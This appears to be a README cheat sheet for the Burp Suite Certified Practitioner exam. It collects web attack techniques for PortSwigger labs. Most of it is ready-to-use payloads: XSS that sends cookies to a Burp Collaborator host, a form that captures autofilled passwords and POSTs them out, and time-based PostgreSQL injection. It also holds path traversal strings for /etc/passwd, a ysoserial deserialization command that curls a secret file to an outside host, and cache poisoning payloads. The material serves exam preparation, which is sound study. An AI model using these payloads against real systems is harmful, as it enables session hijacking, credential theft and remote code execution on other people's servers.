# <img src="https://icons.iconarchive.com/icons/goescat/macaron/1024/burp-suite-icon.png" width=25> BSCP Methodology

## Table of Contents
* [Exam Info](#exam-info)
* [Useful Burp extensions](#useful-burp-extensions-some-of-them-requires-burpsuite-pro)
* [Cross-Site Scripting Section](#cross-site-scripting-section)
   * [Bypass restrictions method 1](#bypass-restrictions-method-1)
   * [Capture credentials from auto-filled forms](#capture-credentials-from-auto-filled-forms)
   * [DOM XSS](#dom-xss)
* [Exploit Server Section](#exploit-server-section)
  * [Send exploit to victim (Reflected XSS in search bar)](#send-exploit-to-victim-reflected-xss-in-search-bar)
* [SQL Injection Section](#sql-injection-section)
  * [PostgreSQL](#postgresql)
    * [Time Based](#time-based)
  * [MySQL](#mysql)
  * [Oracle](#oracle)
  * [SQLite](#sqlite)
* [Command Injection Section](#command-injection-section)
* [Directory traversal Section](#directory-traversal-section)
* [CSRF Section](#csrf-section)
* [Insecure Deserialization Section](#insecure-deserialization-section)
  * [Java](#java)
  * [PHP](#php)
* [HTTP request smuggling Section](#http-request-smuggling-section)
* [Information disclosure Section](#information-disclosure-section)
* [Web Cache Poisoning Section](#web-cache-poisoning-cache)

## Exam Info
[BSCP Cheat sheet](https://gist.github.com/dhmosfunk/b5731d149ffc6c2dd4760d666537b4f6) = needs translate <br>
There is always an administrator account with the username "administrator", plus a lower-privileged account usually called "carlos". If you find a username enumeration vulnerability, you may be able to break into a low-privileged account using the following [username](https://portswigger.net/web-security/authentication/auth-lab-usernames) list and [password](https://portswigger.net/web-security/authentication/auth-lab-passwords) list.

Each application has up to one active user, who will be logged in either as a user or an administrator. You can assume that they will visit the homepage of the site every 15 seconds, and click any links in any emails they receive from the application. You can use exploit server's "send to victim" functionality to target them with reflected vulnerabilities.

<b>If you find an SSRF vulnerability, you can use it to read files by accessing an internal-only service, running on localhost on port 6566.</b>

### Each stage can be cross referenced to the types of vulnerabilities you can observe.
#### Objective for Stage 1: Get any user access

* SQL Injection
* Cross-Site Scripting
* Authentication / Credentials Brute force
* Request Smuggling
* Web Cache Poisoning

#### Objective for Stage 2: Get Admin access

* SQL Injection
* Cross-Site Scripting
* Cross Site Request Forgery
* HTTP host header attacks
* Server-Side Request Forgery
* Access Control vulnerabilities
* Authentication / Credentials Brute force

#### Objective for Stage 3: Read Contents of ‘/home/carlos/secret’

* XML External Entities
* SQL Injection
* Command Injection
* Server-Side Template Injection
* Path Traversal
* File Upload attacks
* Insecure Deserialization

## Useful Burp extensions (some of them requires burpsuite pro)
- Hackvertor
- Copy As Python-Requests
- Java Deserialization Scanner | [ysoserial.jar](https://github.com/frohoff/ysoserial) for manual exploitation<b>(prefer because sometime this extension it doesn't work as it should)</b>
- HTTP Request Smuggler


## Cross-Site Scripting Section
When the exam involve XSS for the user part start search about javascript file in the source code or use the [DOM Invader](#dom-xss) into search forms.<br>
You can find an injection point with some payloads from this repository - [PayloadsAllTheThings XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) <br>
Also here - [XSS Payloads](http://www.xss-payloads.com/payloads-list.html?a#category=all)

### Bypass restrictions method 1
Sometimes we found a XSS injection point but with some keyword restrictions, so we have to bypass these restrictions with some techniques like below.
1. Generate the base64 payload

```bash
echo -n "document.location = 'http://<BURP-COLLABORATOR.NET>/?cookie='+document.cookie" |base64
```

2. Insert the base64 payload into atob function
```javascript
eval(atob("BASE64-PAYLOAD"))
<script>eval(atob("BASE64-PAYLOAD"))</script>
```

### Capture credentials from auto-filled forms
Sometimes we use password managers that fill in forms automatically and with this technique we can grab those credentials just making a small html form.
```javascript
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://zy1cmwt0q8o3vtlolrhvx9nfn6t7hw.burpcollaborator.net',{
  method:'POST',
  mode: 'no-cors',
  body:username.value+':'+this.value
});">
```

### DOM XSS
An awesome google chrome(from burp suite) extension is <b>DOM Invader</b> which you can use it for DOM XSS testing

## Exploit Server Section
#### Send exploit to victim (Reflected XSS in search bar)
With <b>`<meta>`</b> html tag we can redirect the "victim" to our javascript injected search query.
```html
<meta http-equiv="refresh" content='0; URL=https://<LAB_URL>/?search=injection_here' />

<!-- ALL TOGETHER BELOW-->
<meta http-equiv="refresh" content='0; URL=https://<LAB_URL>/?SearchTerm=aa","fd8xsw5l":eval(atob("BASE64-PAYLOAD"))}//' />
```

### Different XSS Payloads
```javascript
${alert(1)}
<svg><animatetransform%20§§=1>
<><img src=1 onerror=alert(1)>
\"-alert(1)}//

//angular
{{$on.constructor('alert(1)')()}}
```

## SQL Injection Section

[SQL Injection cheat sheet PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
<br>
### Labs
[SQL injection with filter bypass via XML encoding](https://github.com/dhmosfunk/BSCP/tree/main/recommended_labs#lab-sql-injection-with-filter-bypass-via-xml-encoding)
<br>
[Blind SQL injection with out-of-band data exfiltration](https://github.com/dhmosfunk/BSCP/tree/main/recommended_labs#lab-blind-sql-injection-with-out-of-band-data-exfiltration)


### PostgreSQL
#### Time Based
Identify time based
```sql
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))
```

Database Dump Time Based<br>

```sql
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
```

Table Dump Time Based <br>

```sql
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
```

Columns Dump Time Based <br>
```sql
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from column_name limit 1
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from column_name where column_name='value' limit 1
```


### MySQL

### Oracle

### SQLite

## Command Injection Section
[Link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#chaining-commands)

## Directory Traversal Section
```bash
../../../etc/passwd # Simple case
..%252f..%252f..%252fetc/passwd # Double URL Encoding
....//....//....//etc/passwd # Stripped non-recursively
../../../etc/passwd%00.png # Null byte bypass 
images/../../../etc/passwd # Validation of start of path
```

## CSRF Section

<img src="https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/CSRF%20Injection/Images/CSRF-CheatSheet.png?raw=true">


## Insecure Deserialization Section


### Java
If you have `Java Deserialization Scanner` burp extension you can do an active scan(pro version only) and maybe you will find something ;) at least exploit it manually with the below tool.
#### ysoseriar.jar
payloads about `ysoseriar` <br>
<b>Dont forget</b> the below payloads requires url encoding after payload are generated
```bash
java -jar ysoseriar.jar CommonsCollections7 'curl -d @/home/carlos/secret k3of2usea0s8kzkwsqnme9bj2a83ws.burpcollaborator.net' | gzip|base64 

java -jar ysoseriar.jar <PAYLOAD> 'COMMAND' | encoding
```
For more information about payloads and stuff you can find in the ysoserial [official repository](https://github.com/frohoff/ysoserial)

### PHP
[phpggc](https://github.com/ambionics/phpggc)


## HTTP request smuggling Section
For manual exploitation CL.TE TE.CL we can use the [Simple HTTP Smuggler Generator CL.TE TE.CL](https://github.com/dhmosfunk/simple-http-smuggler-generator) 


## Information disclosure Section
Always go for directory brute force and for .files(hidden files) e.g. <b>.git</b>

## Web Cache Poisoning Cache

### Web cache poisoning with an unkeyed cookie:
`fehost="-alert(document.cookies)-"`

### Basic Web cache 
`X-Forwarded-Host` header has been used by the application to generate an Open Graph URL inside a meta tag.


### Targeted web cache poisoning using an unknown header
`Vary: User-Agent` -> "For example, if the attacker knows that the User-Agent header is part of the cache key, by first identifying the user agent of the intended victims, they could tailor the attack so that only users with that user agent are affected."

`X-Host: exploitserver.net/resources/js/tracking.js`

Steal other users `User-Agents`:
If you have post functionality you can use this payload:
```html
<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
```

and final step is to poison the victims user-agents stoled from img tag


